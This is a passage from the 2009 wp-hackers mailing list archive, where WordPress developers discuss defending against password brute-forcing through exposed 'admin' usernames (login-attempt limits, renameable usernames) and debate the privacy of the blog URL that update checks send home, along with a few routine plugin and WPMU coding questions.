	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
	<01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
	<862d087f0912070611h2eb700erf72ac3b2076165aa@mail.gmail.com>
Message-ID: <9f34a3610912070632o1b3b5c72x141ff74b3eb8c9bd@mail.gmail.com>

If the problem we discuss here is that exposed/known usernames make it
possible to guess or bruteforce passwords for those usernames,
wouldn?t be a solution to simply add to the core something like the
Limit Login Attempts plugins by Johan Eenfeldt?

<http://wordpress.org/extend/plugins/limit-login-attempts/>

If I understand the issue correctly, I think that a solution like this
would address it without adding any complexity to the UI (and without
unloading cognitive burden on the user).

Demetris
http://op111.net/

From ncrice at gmail.com  Mon Dec  7 14:34:42 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 7 Dec 2009 09:34:42 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <9f34a3610912070632o1b3b5c72x141ff74b3eb8c9bd@mail.gmail.com>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
	<01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
	<862d087f0912070611h2eb700erf72ac3b2076165aa@mail.gmail.com>
	<9f34a3610912070632o1b3b5c72x141ff74b3eb8c9bd@mail.gmail.com>
Message-ID: <862d087f0912070634i2ab4627cw9ab169d14491acb@mail.gmail.com>

I would support that.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Mon, Dec 7, 2009 at 9:32 AM, Demetris <kikizas at gmail.com> wrote:

> If the problem we discuss here is that exposed/known usernames make it
> possible to guess or bruteforce passwords for those usernames,
> wouldn?t be a solution to simply add to the core something like the
> Limit Login Attempts plugins by Johan Eenfeldt?
>
> <http://wordpress.org/extend/plugins/limit-login-attempts/>
>
> If I understand the issue correctly, I think that a solution like this
> would address it without adding any complexity to the UI (and without
> unloading cognitive burden on the user).
>
> Demetris
> http://op111.net/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Mon Dec  7 14:46:11 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 7 Dec 2009 08:46:11 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com> 
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>
Message-ID: <161617690912070646ked5e3cevc55c7fb4f281905e@mail.gmail.com>

On Mon, Dec 7, 2009 at 2:36 AM, Lynne Pope <lynne.pope at gmail.com> wrote:
> 2009/12/7 Mark Jaquith <markjaquith at gmail.com>
>> > Like most website operators, WordPress.org collects
>> non-personally-identifying information of the sort that web browsers ***and
>> servers*** typically make available
>>
>
> This does not cover data collected from software.

Actually, yes, it does. WordPress, the software, runs on servers.

> If any reasonable person

Reasonable people are rarely correct when it comes to legal interpretations.

>> > WordPress.org may collect statistics about the behavior of visitors to
>> its websites. For instance, WordPress.org may reveal how many downloads a
>> particular version got, or say which plugins are most popular based on
>> checks from ***api.wordpress.org, a web service used by WordPress
>> installations to check for new versions of WordPress and plugins***.
>
> "from its websites" - no mention of what is collected from other people's
> websites without their explicit permission.

It doesn't say "from its websites". It says "statistics about the
behavior of visitors to its websites". A WordPress installation
connecting to api.wordpress.org is a visitor to the wordpress.org
website just as much as you and your web browser are.

> At the moment, I'm just at a loss as to how to respond to the questions I am
> getting about this, especially when I agree with people who don't like this
> aspect of WordPress.

My response to them would be "Why are you so paranoid?" What
information, specifically, concerns you? I mean, a URL? Seriously?
Anybody who visits your site knows your URL. How is this is a serious
concern in any way other than theoretical?

-Otto

From wordpress at santosj.name  Mon Dec  7 14:51:35 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Mon, 07 Dec 2009 08:51:35 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com>
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>
Message-ID: <4B1D1677.9020608@santosj.name>

In what way does WordPress.org or Automattic having your URL affect the 
security and privacy of your site?

How does preventing WordPress.org from using this data protect you from 
anything?

Why doesn't the plugins available address your problems with privacy?


The filters were placed in for the sole purpose of overriding the URL 
that is sent and for those concern with privacy. While it could be said 
that the small amount of people who downloaded the plugin verses the 
much larger amount that uses WordPress says that not enough people 
consider sending an URL is all that important. It might just be that not 
enough people realize that their WordPress is sending this information.

It is but the URL, plugins, and themes, along with the PHP version that 
is sent. None of the passwords, visitors (unless you use the 
WordPress.com Stats plugin), etc is sent. There is also a legitimate and 
reasonable purpose behind sending this data and it is to allow for 
upgrading those plugins (however, the URL isn't required, unless they 
changed that, but you could just send www.example.com if you wanted).

By the way, the filters were a compromise to those who said to fork it.

Jacob Santos


Lynne Pope wrote:
> 2009/12/7 Mark Jaquith <markjaquith at gmail.com>
>
>   
>> On Mon, Dec 7, 2009 at 1:33 AM, Lynne Pope <lynne.pope at gmail.com> wrote:
>>     
>>> That doesn't cover data that is sent from WordPress installs though Mark.
>>>       
>> It
>>     
>>> only relates to people who visit wordpress.org.
>>>       
>> It specifically mentions data sent from servers (my emphasis):
>>
>>     
>>> Like most website operators, WordPress.org collects
>>>       
>> non-personally-identifying information of the sort that web browsers ***and
>> servers*** typically make available
>>
>>     
>
> This does not cover data collected from software. If any reasonable person
> read that statement they would infer that it relates to visiting
> wordpress.org and what information may be disclosed on wordpress.org, but
> not what information is collected when they install the WordPress
> application.
>
>
>   
>> And it specifically mentions api.wordpress.org, which is what
>> WordPress installs contact (my emphasis):
>>
>>     
>>> WordPress.org may collect statistics about the behavior of visitors to
>>>       
>> its websites. For instance, WordPress.org may reveal how many downloads a
>> particular version got, or say which plugins are most popular based on
>> checks from ***api.wordpress.org, a web service used by WordPress
>> installations to check for new versions of WordPress and plugins***.
>>
>>     
>
> "from its websites" - no mention of what is collected from other people's
> websites without their explicit permission.
>
>
>   
>>> My question relates to the sending of the blog URL in the
>>> http_headers_useragent. I still cannot see any reason why this
>>>       
>> information
>>     
>>> is being sent to WordPress or what use WordPress is making of it.
>>>       
>> For one thing, it gives us a nice, standard, unique identifier for the
>> blog. That's what URLs were made for! Matt suggested some theoretical
>> anonymous uses that related to looking for patterns.
>>
>>     
>
> This is also not anonymous and no opt-in, consent or otherwise is available.
> There are other ways of submitting unique identifiers without compromising
> privacy.
>
>
>   
>>> Since Matt
>>> indicated that its use would be revisited, and that was 2 years ago with
>>> nothing happening since, I'd like to know if there are any plans to
>>>       
>> change
>>     
>>> this for non-identifying data or if it even that is not needed.
>>>       
>> I haven't seen any continuing strenuous objections. I know I'm the one
>> that started that thread ? but my objections were largely addressed by
>> Matt's responses and the privacy policy. The privacy policy makes it
>> pretty clear what WordPress.org can and can't do with the data. So no,
>> I'm not aware of any plans to change this.
>>
>>     
>
> Sure, there was a knee-jerk reaction back in 2007 but given the responses at
> that time (specifically, "if you don't like it, fork") its not surprising
> that people just shut up and either went their own way or hacked the core.
> The question still remains - why does WordPress need to use an identifying
> blog URL and why is it such a big deal to change this?
>
>
>   
>> The more I thought about it, the more my knee-jerk objections faded
>> away. Your server is doing an HTTP request, so the server knows your
>> server's IP address. You can figure out what blog domains are hosted
>> on that IP with a search on Bing or several other search engines. So
>> if WordPress.org really wanted to know your URL, it could find it.
>>
>>     
>
> Irrelevant. A lot of information is discoverable if anyone wants to search
> for it. If WordPress wanted to run whois and IP lookups that is up to
> WordPress. People should not be mandated to hand over personal information
> without knowledge that they are doing so and without the option to opt-in to
> this.
>
>
>   
>>> The reason I'm asking now is that I have been fixing a site that was
>>>       
>> hacked.
>>     
>>> The reason it was hacked was that the owner didn't know of an update that
>>> would have protected his site. The reason he didn't know was because he
>>>       
>> was
>>     
>>> using plugins to prevent update checks - and was only using those because
>>>       
>> he
>>     
>>> didn't want to send his site URL to WordPress. (Ok, he would have known
>>>       
>> if
>>     
>>> he had been keeping track of updates externally, but this is a case where
>>> privacy concerns removed an important feature from WordPress and
>>> disadvantaged him in the process).
>>>
>>> A quick look at the plugins shows that people are still disabling these
>>> update checks:
>>>
>>>       
>> http://wordpress.org/extend/plugins/search.php?q=core+update+notification
>>     
>>> How many are doing this just because they want to protect their privacy?
>>>       
>> That sounds like a case of squashing a fly with a sledgehammer. If you
>> still feel strongly about not sending a URL, even after reading the
>> WordPress.org privacy policy and doing a few "ip:<server IP>" searches
>> on Bing, there are ways of doing that without completely eliminating
>> update checks. As a WordPress consultant, I would hope that you would
>> strongly advise your clients against eliminating update checks!
>>
>>     
>
> What I would advise has no bearing on what people are actually doing. The
> plugins are available and people are using them. While I see the update
> checks as invaluable, not everyone knows how to anonymise these.
>
> It seems such a trivial change to make - why not just a "send stats to
> wordpress.org y/n" to switch the blog URL on or off?
> At the moment, I'm just at a loss as to how to respond to the questions I am
> getting about this, especially when I agree with people who don't like this
> aspect of WordPress.
>
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From otto at ottodestruct.com  Mon Dec  7 15:33:41 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 7 Dec 2009 09:33:41 -0600
Subject: [wp-hackers] Little problem while importing Wordpress.com WXR
	into regular wordpress installation...
In-Reply-To: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
References: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
Message-ID: <161617690912070733i5e53a495q745f1d9b4bfaedbe@mail.gmail.com>

http://wordpress.org/extend/plugins/youtube-brackets/

This does exactly what you need. It's also minimal and fast, as it
does nothing more than allowing [youtube=whatever] to work.

-Otto



On Sun, Dec 6, 2009 at 2:13 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Wordpress.com let's users to embed youtube videos (and some others)
> using following syntax:
>
> [youtube=http://in.youtube.com/watch?v=VWE7oVKe2Ws]
>
> Now when we did export from Wordpress.com and imported WXR into
> regular wordpress installation, all we get in the post is that tag in
> textual representation. No resolution into embed video happens. I
> guess it's because regular wordpress doesn't support this syntax. Is
> there any plugin that does mimic such behavior? Or any hack to turn
> those tags into embeds?
>
> I know it's possible to write a plugin, but maybe there already exists one?
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Mon Dec  7 16:01:47 2009
From: scribu at gmail.com (scribu)
Date: Mon, 7 Dec 2009 18:01:47 +0200
Subject: [wp-hackers] Possible security patch
In-Reply-To: <9f34a3610912070632o1b3b5c72x141ff74b3eb8c9bd@mail.gmail.com>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
	<01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
	<862d087f0912070611h2eb700erf72ac3b2076165aa@mail.gmail.com>
	<9f34a3610912070632o1b3b5c72x141ff74b3eb8c9bd@mail.gmail.com>
Message-ID: <349fe48b0912070801x656c1141i50cb525607bbfb38@mail.gmail.com>

On Mon, Dec 7, 2009 at 4:32 PM, Demetris <kikizas at gmail.com> wrote:

> If the problem we discuss here is that exposed/known usernames make it
> possible to guess or bruteforce passwords for those usernames,
> wouldn?t be a solution to simply add to the core something like the
> Limit Login Attempts plugins by Johan Eenfeldt?
>
> <http://wordpress.org/extend/plugins/limit-login-attempts/>
>
> If I understand the issue correctly, I think that a solution like this
> would address it without adding any complexity to the UI (and without
> unloading cognitive burden on the user).
>
> Demetris
> http://op111.net/
>


The best solution I've heard so far. +1


-- 
http://scribu.net

From tunamaxx at yahoo.com  Mon Dec  7 16:52:47 2009
From: tunamaxx at yahoo.com (Tuna Can)
Date: Mon, 7 Dec 2009 08:52:47 -0800 (PST)
Subject: [wp-hackers] Possible security patch
Message-ID: <483210.16553.qm@web65710.mail.ac4.yahoo.com>

Just a thought... What if by default the admin account was setup so that it could do any 'administrative' duties required, but just could not post?

In conjunction with something like the WP-SU plugin functionality mentioned earlier, the write post / page could provide a quick explanation and a prompt to swap to an appropriate user. 

Or...

Somehow 'couple' a secondary user to the admin account. Logging in as an admin and making a post would just use the 'coupled' user without exposing the admin ID. 

Excuse me if these ideas are out to lunch!

Thanks,

Tony 




On 2009-12-07, at 5:20 AM, Ian Stewart <ian at themeshaper.com> wrote:

I'm for prompting the user to start another account AND no longer suggesting
admin be the user name.

On Mon, Dec 7, 2009 at 2:57 AM, Ozh <ozh at planetozh.com> wrote:

Mark Jaquith wrote:
I think I have a better method of tackling this issue: We now prompt
the user in the wp-admin when they are using the default install
password or a reset password. What about if we do a similar prompt if
"admin" is the only user on the blog, suggesting that they create a
second user name and use THAT for posting?

What about simply asking the user about renaming 'admin' to something more
personal?

Ozh
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers




-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      __________________________________________________________________
Be smarter than spam. See how smart SpamGuard is at giving junk email the boot with the All-new Yahoo! Mail.  Click on Options in Mail and switch to New Mail today or register for free at http://mail.yahoo.ca


From otto at ottodestruct.com  Mon Dec  7 17:09:38 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 7 Dec 2009 11:09:38 -0600
Subject: [wp-hackers] Possible security patch
In-Reply-To: <483210.16553.qm@web65710.mail.ac4.yahoo.com>
References: <483210.16553.qm@web65710.mail.ac4.yahoo.com>
Message-ID: <161617690912070909l7746c37fs7f81c0a78f596eb3@mail.gmail.com>

Ugh. Lots of solutions to what strikes me as a simple problem.

Actual solution: Let people change their username.

Seems simple enough to me. There's perfectly valid reasons to want a
different username, and it doesn't necessarily have anything to do
with security. I prefer to use "otto" instead of "admin". That's not a
security feature, that's just me wanting to use a different name.

There's no sane reason I can see for making the username unmodifiable.
It's easy enough to allow it to be altered, and a simple check to see
if the username is already taken is not difficult to add.

So forget all this talk. Just let people change the username. It's the
simplest solution by far. Yes, it doesn't address every "security"
concern, but it will eliminate the issue from coming up time and
again, and frankly there's no good reason I can find to not do it.

-Otto

From feeds at armeda.com  Mon Dec  7 17:22:27 2009
From: feeds at armeda.com (Dre Feeds)
Date: Mon, 7 Dec 2009 09:22:27 -0800
Subject: [wp-hackers] Possible security patch
In-Reply-To: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
References: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
Message-ID: <CC049146-4676-4595-9E90-EE5ED332F11A@armeda.com>




> Mark Jaquith wrote:
>> I think I have a better method of tackling this issue: We now prompt
>> the user in the wp-admin when they are using the default install
>> password or a reset password. What about if we do a similar prompt if
>> "admin" is the only user on the blog, suggesting that they create a
>> second user name and use THAT for posting?
>
> What about simply asking the user about renaming 'admin' to  
> something more
> personal?
>
> Ozh

What about a second built-in account specifically built for posting  
and simply asking the user to rename this account. I think we separate  
them all together so there is no confusion.

Dre Armeda

From ian at themeshaper.com  Mon Dec  7 17:38:54 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Mon, 7 Dec 2009 11:38:54 -0600
Subject: [wp-hackers] Possible security patch
In-Reply-To: <CC049146-4676-4595-9E90-EE5ED332F11A@armeda.com>
References: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<CC049146-4676-4595-9E90-EE5ED332F11A@armeda.com>
Message-ID: <a8405fa30912070938t5fb08a5fwd6410594c5841697@mail.gmail.com>

I still think using a sanitized display name like, 'My Display Name'
becoming 'my-display-name', instead of using a sanitized login name would be
simpler. It would cover the classes and nice-looking URLs wouldn't it? And
it would give users the choice I imagine they think they're getting about
what to reveal in classes and URLs when they choose their display name.

On Mon, Dec 7, 2009 at 11:22 AM, Dre Feeds <feeds at armeda.com> wrote:

>
>
>
>  Mark Jaquith wrote:
>>
>>> I think I have a better method of tackling this issue: We now prompt
>>> the user in the wp-admin when they are using the default install
>>> password or a reset password. What about if we do a similar prompt if
>>> "admin" is the only user on the blog, suggesting that they create a
>>> second user name and use THAT for posting?
>>>
>>
>> What about simply asking the user about renaming 'admin' to something more
>> personal?
>>
>> Ozh
>>
>
> What about a second built-in account specifically built for posting and
> simply asking the user to rename this account. I think we separate them all
> together so there is no confusion.
>
> Dre Armeda
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From wp at xentek.net  Mon Dec  7 19:42:00 2009
From: wp at xentek.net (Eric Marden)
Date: Mon, 7 Dec 2009 14:42:00 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <eccf1e7c0912050300l293bb87cqd4bb2151f9458bc0@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<eccf1e7c0912050300l293bb87cqd4bb2151f9458bc0@mail.gmail.com>
Message-ID: <40811E52-6539-4C44-B87B-3002EB7055CF@xentek.net>

On Dec 5, 2009, at 6:00 AM, Jordi Canals wrote:

> As soon as we create a new post type, it should create the
> corresponding menus in the proper 'Action' menus.


I'm not sure I'd want to automatically create menus and such.  
Sometimes You want more control or are using them for something with  
an entirely different kind of content then a traditional 'post'.  
Consider that the Media Library is a custom UI for the 'attachment'  
post type, and extrapolate from there.

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From tim at silentgap.com  Mon Dec  7 20:15:20 2009
From: tim at silentgap.com (Tim Schoffelman)
Date: Mon, 7 Dec 2009 14:15:20 -0600
Subject: [wp-hackers] WordPress MU Category Slugs
Message-ID: <5b1aecc0912071215idf05d7ei8bf9e4e80f562f2b@mail.gmail.com>

Just out of curiosity - was/is there a reason why WordPress MU doesn't allow
category slugs to be edited. I've looked through this conversation -
http://mu.wordpress.org/forums/topic/12258 - but I'm interested in any
additional thoughts.

~Tim

From hempsworth at googlemail.com  Mon Dec  7 20:46:33 2009
From: hempsworth at googlemail.com (Alex Hempton-Smith)
Date: Mon, 7 Dec 2009 20:46:33 +0000
Subject: [wp-hackers] WPMU: choose which blog to create a new post in -
	wp_insert_post()
Message-ID: <5a1dad880912071246m572ad1dav76453195aca23bbc@mail.gmail.com>

Hi all,

For a WPMU plugin I'm developing I need to create a post in a specific blog
using the *wp_insert_post()* function.
I.e. whilst I'm browsing another blog I should be able to hit a button and a
post is created on another one. How would I go about this?

-- Alex  (Hempsworth)

From dragonfly at dragonflyeye.net  Mon Dec  7 20:49:38 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Mon, 7 Dec 2009 15:49:38 -0500
Subject: [wp-hackers] WPMU: choose which blog to create a new post in -
	wp_insert_post()
In-Reply-To: <5a1dad880912071246m572ad1dav76453195aca23bbc@mail.gmail.com>
References: <5a1dad880912071246m572ad1dav76453195aca23bbc@mail.gmail.com>
Message-ID: <77b239a00912071249j181c1f9ahf7c0a9c0f74b3be7@mail.gmail.com>

http://holisticnetworking.net/plugins/wordpress-mu-function-list/

Check "switch_to_blog" and "restore_current_blog" for details.

On Mon, Dec 7, 2009 at 3:46 PM, Alex Hempton-Smith <
hempsworth at googlemail.com> wrote:

> Hi all,
>
> For a WPMU plugin I'm developing I need to create a post in a specific blog
> using the *wp_insert_post()* function.
> I.e. whilst I'm browsing another blog I should be able to hit a button and
> a
> post is created on another one. How would I go about this?
>
> -- Alex  (Hempsworth)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From autremonde75 at gmail.com  Mon Dec  7 21:18:47 2009
From: autremonde75 at gmail.com (Olivier)
Date: Mon, 7 Dec 2009 13:18:47 -0800 (PST)
Subject: [wp-hackers] single quote #039; issue when querying the DB
Message-ID: <aae1bd0e-d442-436e-9b5b-3c3be8da4e9a@j4g2000yqe.googlegroups.com>

Hello,

I am encountering a big problem and I canno't find any "clean"
solution.

When a meta_value is saved within the usermeta table, if it contains a
single quote then it is converted to #39;
for instance : tot'o is converted to tot#39;o

Then when you get it back from the DB, it will be tot#039;o (note the
added 0). This is not a problem if you just need to output data.

But when it comes to perform a query with a condition on the
meta_value, then I am lost because when I convert the single quote
with any function like esc_html, it is converted to #039; and not #39;
so if I query on "WHERE meta_value = $myvalue" which contains #039; it
will always fail :(

Any idea?

I could obviously add a function to convert 039 to 39 before sending
to the DB but well, if there is any built in function that does all
the job directly (clean one step conversion from single quote to
#39;), I would rather use it.

Thanks!

Olivier

From charles at cefm.ca  Mon Dec  7 21:21:20 2009
From: charles at cefm.ca (Charles Frees-Melvin)
Date: Mon, 7 Dec 2009 17:21:20 -0400
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912070938t5fb08a5fwd6410594c5841697@mail.gmail.com>
References: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<CC049146-4676-4595-9E90-EE5ED332F11A@armeda.com>
	<a8405fa30912070938t5fb08a5fwd6410594c5841697@mail.gmail.com>
Message-ID: <538B49DC-3C45-4CA0-850F-D4B1654832B1@cefm.ca>

That is really not a good idea, becase a theme could use the classes,  
and anyone can change their display name,   even a subscriber. Thus  
makin classes depending on a display name subject to excessive  
breaking and endless nightmares for professional theme designers.

---
Charles E. Frees-Melvin
charles at cefm.ca
CEFM.ca / CEFM.tv

Sent from my Apple iPhone 3G

On 2009-12-07, at 13:38, Ian Stewart <ian at themeshaper.com> wrote:

> I still think using a sanitized display name like, 'My Display Name'
> becoming 'my-display-name', instead of using a sanitized login name  
> would be
> simpler. It would cover the classes and nice-looking URLs wouldn't  
> it? And
> it would give users the choice I imagine they think they're getting  
> about
> what to reveal in classes and URLs when they choose their display  
> name.
>
> On Mon, Dec 7, 2009 at 11:22 AM, Dre Feeds <feeds at armeda.com> wrote:
>
>>
>>
>>
>> Mark Jaquith wrote:
>>>
>>>> I think I have a better method of tackling this issue: We now  
>>>> prompt
>>>> the user in the wp-admin when they are using the default install
>>>> password or a reset password. What about if we do a similar  
>>>> prompt if
>>>> "admin" is the only user on the blog, suggesting that they create a
>>>> second user name and use THAT for posting?
>>>>
>>>
>>> What about simply asking the user about renaming 'admin' to  
>>> something more
>>> personal?
>>>
>>> Ozh
>>>
>>
>> What about a second built-in account specifically built for posting  
>> and
>> simply asking the user to rename this account. I think we separate  
>> them all
>> together so there is no confusion.
>>
>> Dre Armeda
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> -- 
> Ian Stewart
>
> http://ThemeShaper.com/
> http://twitter.com/iandstewart/
> http://ianstewart.stumbleupon.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From lynne.pope at gmail.com  Mon Dec  7 22:01:24 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 8 Dec 2009 11:01:24 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4B1D1677.9020608@santosj.name>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com> 
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com> 
	<4B1D1677.9020608@santosj.name>
Message-ID: <427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com>

2009/12/8 Jacob Santos <wordpress at santosj.name>

> In what way does WordPress.org or Automattic having your URL affect the
> security and privacy of your site?
>

It compromises privacy because users are not being given the option to send
or not send information about their site. It compromises security when users
disable update checks in order to avoid sending information they don't wish
to send.

The specific response I got from the people I was working with was that
business information, such as which plugins they use, is nobody's business
except theirs. They consider this to be business information. Plugin and
theme data contains identifying information about products and staff which
they do not want broadcast to anyone.


> How does preventing WordPress.org from using this data protect you from
> anything?
>

WordPress.org is not a legal entity and cannot therefore be held legally
accountable for misuse of data. They have no confidence in WordPress.org's
ability to keep the data private and confidential and say that as they do
not opt-in to sharing it then wordpress.org has no legal right to collect
it.


>
> Why doesn't the plugins available address your problems with privacy?
>
>
> The filters were placed in for the sole purpose of overriding the URL that
> is sent and for those concern with privacy. While it could be said that the
> small amount of people who downloaded the plugin verses the much larger
> amount that uses WordPress says that not enough people consider sending an
> URL is all that important. It might just be that not enough people realize
> that their WordPress is sending this information.
>

Which plugin just overrides the blog URL? If there is one that simply does
that then I'd point them to it.


>
> It is but the URL, plugins, and themes, along with the PHP version that is
> sent. None of the passwords, visitors (unless you use the WordPress.com
> Stats plugin), etc is sent. There is also a legitimate and reasonable
> purpose behind sending this data and it is to allow for upgrading those
> plugins (however, the URL isn't required, unless they changed that, but you
> could just send www.example.com if you wanted).
>
> By the way, the filters were a compromise to those who said to fork it.
>

Providing the means to check if plugins, theme, or core updates are
available is great. The stickler is the sending of the blog URL (and for
this company - data about custom plugins).

IMO, there needs to be more transparency about what WordPress does behind
the scenes and what data is collected. I understand the concerns when custom
plugins & themes use staff and product names - this sends way too much
identifying information!

The alternative would be if WordPress only checked against theme and plugin
names that are in the WordPress repository, instead of collecting data on
every theme and plugin.

I love the work you did on this Jacob. However, its now 2 years since
wordpress.org started collecting blog URL's with the update and it's still
unnecessary data capture. If WordPress.org has future plans for using this
information then a simple opt-in would prevent these kinds of issues. If
there is no good reason for capturing the URL then perhaps its time it was
removed?

Lynne

From hempsworth at googlemail.com  Mon Dec  7 22:15:28 2009
From: hempsworth at googlemail.com (Alex Hempton-Smith)
Date: Mon, 7 Dec 2009 22:15:28 +0000
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com> 
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com> 
	<4B1D1677.9020608@santosj.name>
	<427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com>
Message-ID: <5a1dad880912071415t22cf4ce3yc95218c280d62c0a@mail.gmail.com>

I know we hate adding more options and all... but would it really be a
terrible thing to add an option to the Settings->Privacy page that allowed
some flexibility with which data is sent to wordpress.org? Checkboxes (auto
ticked), so users could see exactly what's being sent and can choose if
they're comfortable with that.

This is a CORE 'feature' sending out data, therefore a CORE option is
needed; we shouldn't ask users to install a plugin to keep their own data
safe - regardless of our feelings on that particular data, anonymous or not.
Commercial desktop software which sends crash reports, for example, ALWAYS
asks if it can send that ANONYMOUS data.

Perhaps also on the first login after installation we could have an
alert/nag to ask if the admin wants to visit the privacy page and customise
what's sent?

Instead of US deciding what pieces of users data is sent, shouldn't we be
leaving that choice up to THEM? I'm sure it wouldn't take long for the
interested parties in this discussion to come up with a patch. Just my 2
cents though...

-- Alex  (Hempsworth)

From gaarai at gaarai.com  Mon Dec  7 22:20:01 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 07 Dec 2009 16:20:01 -0600
